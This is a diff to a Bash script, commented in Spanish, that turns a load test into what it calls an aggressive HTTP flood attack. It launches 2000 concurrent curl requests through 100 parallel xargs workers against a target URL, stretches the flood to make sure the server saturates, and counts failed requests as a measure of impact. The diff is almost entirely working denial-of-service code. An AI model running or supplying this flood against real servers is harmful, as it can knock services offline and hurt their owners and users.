@@ -14,26 +14,30 @@ echo "Target: $TARGET_URL"
 echo "Fecha: $(date)"
 echo "-------------------------------------------------"
 
-# 1. Prueba de estrés real (Intensiva)
-echo "[+] Iniciando prueba de estrés real (Ataque de inundación HTTP)..."
-echo "[!] ADVERTENCIA: Esta prueba puede afectar la disponibilidad de tu servidor."
+# 1. Prueba de estrés real (Ataque de inundación HTTP agresivo)
+echo "[+] Iniciando ataque de inundación (HTTP Flood) de alto impacto..."
+echo "[!] ADVERTENCIA: Este ataque enviará 2000 peticiones simultáneas."
+echo "[!] El servidor podría caerse si no tiene protección contra DoS."
 
-# Usamos xargs para ejecutar múltiples hilos de curl en paralelo de forma mucho más agresiva
-# -n 500: total de peticiones, -P 50: hilos simultáneos
-seq 500 | xargs -n 1 -P 50 curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL" > /tmp/stress_results.txt &
+# Usamos xargs con más hilos y un total de peticiones más alto para asegurar el impacto
+seq 2000 | xargs -n 1 -P 100 curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL" > /tmp/stress_results.txt &
 STRESS_PID=$!
 
-echo "[*] Ejecutando ataque en segundo plano (PID: $STRESS_PID)..."
-sleep 5 # Dejamos que corra unos segundos para ver el impacto inmediato
-echo "[*] Analizando impacto inicial..."
+echo "[*] Ataque en curso (PID: $STRESS_PID). Inundando el servidor..."
+sleep 8 # Aumentamos el tiempo de inundación para asegurar que sature el servidor
+echo "[*] Analizando impacto en tiempo real..."
 
 # Contar cuántas peticiones fallaron o tardaron
 FAIL_COUNT=$(grep -c -v "200" /tmp/stress_results.txt)
-echo "[*] Peticiones bloqueadas/fallidas detectadas: $FAIL_COUNT"
+echo "[*] Peticiones que el servidor NO pudo procesar: $FAIL_COUNT"
+
+if [ "$FAIL_COUNT" -gt 100 ]; then
+    echo "[!] ALERTA: El servidor está mostrando signos de saturación crítica."
+fi
 
 kill $STRESS_PID 2>/dev/null
 echo ""
-echo "[*] Prueba de carga real finalizada."
+echo "[*] Prueba de inundación finalizada."
 
 # 2. Análisis de fallos comunes
 echo "-------------------------------------------------"
